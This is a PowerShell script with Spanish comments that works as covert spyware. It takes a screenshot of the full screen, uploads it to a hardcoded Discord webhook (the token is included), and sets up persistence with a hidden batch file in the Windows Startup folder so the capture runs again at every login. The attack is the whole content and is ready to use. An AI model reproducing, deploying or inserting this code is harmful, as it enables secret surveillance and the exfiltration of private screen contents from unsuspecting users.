# Función para capturar y enviar la captura de pantalla al webhook
function CaptureAndSendScreenshot {
    # Definir la URL del webhook
    $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

    # Definir la archivo temporal de la captura de pantalla
    $screenshotFile = "$env:TEMP\SC.png"

    # Capturar la pantalla y guardarla en el archivo temporal
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)

    # Verificar si el archivo de captura de pantalla se creó exitosamente y tiene contenido
    if ((Test-Path $screenshotFile) -and (Get-Item $screenshotFile).length -gt 0) {
        try {
            # Envío de la captura de pantalla al webhook
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile -ErrorAction Stop
        } catch {
            Write-Host "Ocurrió un error al intentar enviar la captura de pantalla al webhook: $_"
        }
    } else {
        Write-Host "La captura de pantalla no se realizó correctamente o el archivo está vacío. No se pudo enviar al webhook."
    }
}

# Ejecutar la función de captura de pantalla una vez
CaptureAndSendScreenshot

# Crear un archivo por lotes (batch) para ejecutar el script en segundo plano
$batchScriptPath = "$env:TEMP\RunInvisible.bat"
$batchScriptContent = "@echo off`npowershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII

# Copiar el archivo por lotes a la carpeta de inicio de Windows
$startupFolder = [Environment]::GetFolderPath("Startup")
$batchScriptDestination = Join-Path -Path $startupFolder -ChildPath "RunInvisible.bat"
Copy-Item -Path $batchScriptPath -Destination $batchScriptDestination -Force
